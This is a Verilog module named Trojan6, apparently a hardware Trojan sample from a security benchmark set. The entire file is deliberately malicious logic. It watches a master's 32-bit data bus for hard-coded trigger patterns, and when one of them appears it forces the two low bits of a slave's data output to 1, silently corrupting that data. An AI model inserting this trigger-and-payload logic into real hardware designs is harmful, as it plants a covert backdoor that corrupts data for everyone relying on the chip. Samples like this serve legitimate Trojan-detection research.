module Trojan6 (
    input wire [31:0] m0_data_o,
    input wire [31:0] i_s15_data_o,
    output wire [31:0] i_s15_data_o_TrojanPayload 
);

wire [1:0] Trojanstate;

assign Trojanstate = (m0_data_o == 32'd0) ? 2'b00 :
                     (m0_data_o == 32'b00110101010100111011100001101100) ? 2'b01 :
                     (m0_data_o == 32'b11101010101010101101100011111111) ? 2'b10:
                     (m0_data_o == 32'b00001010101010010111000010111000) ? 2'b11 :
                     2'b00; // Default state

assign i_s15_data_o_TrojanPayload = (Trojanstate == 2'b11) ? {i_s15_data_o[31:2], 2'b11} : i_s15_data_o;

endmodule
